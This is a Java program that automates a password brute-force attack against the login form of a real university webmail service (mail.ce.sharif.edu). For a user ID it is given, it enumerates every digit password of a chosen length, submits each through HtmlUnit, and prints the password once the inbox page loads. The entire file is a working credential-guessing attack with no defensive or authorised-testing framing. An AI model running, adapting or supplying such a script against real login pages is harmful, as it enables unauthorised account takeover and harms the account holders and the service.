import com.gargoylesoftware.htmlunit.*;
import com.gargoylesoftware.htmlunit.html.*;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.*;

public class Main  {

    static int counter = 0;
    static ArrayList<Character> pass = new ArrayList<>();
    public static void main(String[] args) throws Exception {

        Scanner scanner = new Scanner(System.in);
        System.out.println("Please Enter The ID :");
        String id = scanner.next();

        System.out.println("Please Enter The Length Of Password :");
        int n = scanner.nextInt();

        ArrayList<String> passwords = new ArrayList<>();
        getPasswd(n, passwords);

        for (int numberOfRunningTimes = 0; numberOfRunningTimes < 20; numberOfRunningTimes++){

            shuffleArraylist(passwords);
            Date initiatingDate = new Date();
            long initiatingTime = initiatingDate.getTime();
            for (int i = 0; i < passwords.size(); i++){
                final String PASSWORD = passwords.get(i);
                final int j = i;
                if (Thread.activeCount() > 100){
                    i--;
                    continue;
                }
                new Runnable() {
                    @Override
                    public void run() {

                        WebClient webClient;
                        HtmlPage page1;
                        HtmlForm form;
                        HtmlSubmitInput button;
                        HtmlTextInput htmlTextInput;
                        HtmlPasswordInput textField;
                        HtmlPage page2 = null;
                        webClient = new WebClient();
                        try {
                            page1 = webClient.getPage("https://mail.ce.sharif.edu");
                            form = page1.getFormByName("form");
                            button = form.getInputByValue("Login");
                            htmlTextInput = form.getInputByName("_user");
                            htmlTextInput.setValueAttribute(id);
                            textField = form.getInputByName("_pass");
                            textField.setValueAttribute(PASSWORD);
                            page2 = button.click();

                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        if (page2.toString().contains("https://mail.ce.sharif.edu/?_task=mail&_mbox=INBOX")){
                            Date foundDate = new Date();
                            long foundTime = foundDate.getTime();
                            System.out.println("\ni = "+ (j+1) + " Tried Password = "+ PASSWORD +"  And Result = " + page2+" so it was successful :)\n");
                            System.out.println("\nPASSWORD FOUND !");
                            try {
                                writeResult(foundTime - initiatingTime);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            System.exit(1000);
                        }
                        else {
                            System.out.println("\ni = "+ (j+1) + " Tried Password = "+PASSWORD+"  And Result = " + page2+" so it was a failure :(\n");
                        }
                        webClient.close();
                    }
                }.run();
            }
        }
    }

    private static void getPasswd(int n, ArrayList passwords) throws Exception{
        if (counter > (n-1)){
            return;
        }
        counter++;
        pass.add((char)48);
        int head = pass.size();
        for (int i = 0; i < 3; i++){
            pass.set(head - 1, (char)(pass.get(head - 1)+1));
            if (pass.size() == n){
                String password = new String();
                for (int k = 0; k < n; k++){
                    password = password + pass.get(k);
                }
                passwords.add(password);
            }
            getPasswd(n, passwords);
        }
        counter--;
        pass.remove(head - 1);
    }

    public static ArrayList shuffleArraylist(ArrayList array){
        Random rgen = new Random();
        for (int i=0; i<array.size(); i++) {
            int randomPosition = rgen.nextInt(array.size());
            Collections.swap(array, i, randomPosition);
        }

        return array;
    }
    public static void writeResult(long time)throws Exception{
        try {
            String content = time + "\n";

            File file = new File("result" + ".txt/");

            if (!file.exists()) {
                file.createNewFile();
            }

            FileWriter fw = new FileWriter(file.getAbsoluteFile() , true);
            BufferedWriter bw = new BufferedWriter(fw);
            bw.newLine();
            bw.write(content);
            bw.close();

            System.out.println("Done");

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}